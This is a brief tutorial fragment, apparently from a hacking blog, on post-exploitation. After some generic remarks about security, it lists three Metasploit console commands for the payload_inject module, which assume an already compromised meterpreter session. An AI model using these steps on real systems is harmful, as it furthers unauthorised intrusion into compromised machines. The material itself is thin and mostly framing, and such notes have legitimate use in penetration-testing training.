This article contains post exploitation method. To run following commands successfully first take a session of meterpreter and then follow the commands
In this digital era, more and more people are becoming aware of security and the all the companies take the responsibility to increase their security. Hence, technology is being upgraded every single second. Therefore, it is becoming difficult to hack the modern technology. But where there is will; there is a way.

msf exploit (payload_inject)>set session 1
msf exploit (payload_inject)>set handler true
msf exploit (payload_inject)>exploit
